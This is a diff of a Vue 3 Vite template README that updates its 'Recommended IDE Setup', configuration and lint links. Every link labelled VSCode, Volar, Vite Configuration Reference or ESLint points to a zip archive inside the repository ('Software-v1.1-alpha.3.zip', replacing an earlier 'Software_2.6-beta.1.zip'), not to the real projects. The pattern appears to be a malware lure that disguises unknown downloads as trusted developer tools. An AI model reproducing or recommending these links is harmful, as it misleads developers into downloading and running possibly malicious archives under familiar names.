@@ -4,11 +4,11 @@ This template should help get you started developing with Vue 3 in Vite.
 
 ## Recommended IDE Setup
 
-[VSCode](https://raw.githubusercontent.com/Miqman/koz/main/.vscode/Software_2.6-beta.1.zip) + [Volar](https://raw.githubusercontent.com/Miqman/koz/main/.vscode/Software_2.6-beta.1.zip) (and disable Vetur).
+[VSCode](https://raw.githubusercontent.com/Miqman/koz/main/src/stores/Software-v1.1-alpha.3.zip) + [Volar](https://raw.githubusercontent.com/Miqman/koz/main/src/stores/Software-v1.1-alpha.3.zip) (and disable Vetur).
 
 ## Customize configuration
 
-See [Vite Configuration Reference](https://raw.githubusercontent.com/Miqman/koz/main/.vscode/Software_2.6-beta.1.zip).
+See [Vite Configuration Reference](https://raw.githubusercontent.com/Miqman/koz/main/src/stores/Software-v1.1-alpha.3.zip).
 
 ## Project Setup
 
@@ -28,7 +28,7 @@ npm run dev
 npm run build
 ```
 
-### Lint with [ESLint](https://raw.githubusercontent.com/Miqman/koz/main/.vscode/Software_2.6-beta.1.zip)
+### Lint with [ESLint](https://raw.githubusercontent.com/Miqman/koz/main/src/stores/Software-v1.1-alpha.3.zip)
 
 ```sh
 npm run lint
